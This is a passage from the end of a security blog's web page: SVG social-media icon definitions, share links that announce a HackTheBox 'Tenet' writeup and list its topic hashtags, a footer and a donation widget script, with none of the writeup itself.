5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol> <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol> <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111 C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587 c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol> <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol> <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562 C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563 h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243 C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982 c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379 c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379 C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416 c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575 H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685 c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38 c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99 c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522 c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854 c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol> <symbol id="icon-telegram" viewBox="0 0 80 80"> <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" /> </symbol> <symbol id="icon-youtube" viewBox="0 0 24 24"> <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" /> </symbol> <symbol id="icon-gitlab" viewBox="-5 -15 220 200"> <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" /> <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" /> <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" /> &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt; <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" /> <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" /> <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" /> </symbol> </defs></svg> <p><br /></p> <section class="share"> <h2> Share </h2> <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=HackTheBox &quot;Tenet&quot; wirteup is now available!%20https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/%20via%20&#64;0xbro1&amp;hashtags=HackTheBox,Medium,Linux,B2R,code-review,php-deserialization,password-reuse,hardcoded-credentials,race-condition,temp-file-poisoning,writeup," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter"> <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg> </a> <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook"> <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg> </a> <a aria-label="Share on Google Plus" href="https://plus.google.com/share?url=https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+"> <svg class="icon icon-google-plus"><use xlink:href="#icon-google-plus"></use></svg> </a> </section> <footer> <p align="center">Made by <code>0x<i>bro</i></code> with 💜 💛 </p> </footer> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xbro" data-description="Support me on Buy me a coffee!" data-message="I'm creating cyber security contents like CTF writeups, videos and articles. Do you find my work interesting? You can now offer me a cup of coffee!" data-color="#BD5FFF" data-position="left" data-x_margin="18" data-y_margin="18"></script> </div> </div> <a href="#" id="search-button" class="search-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-search"></use></svg> </a> <div class="search-overlay"></div> </div> </body> </html>
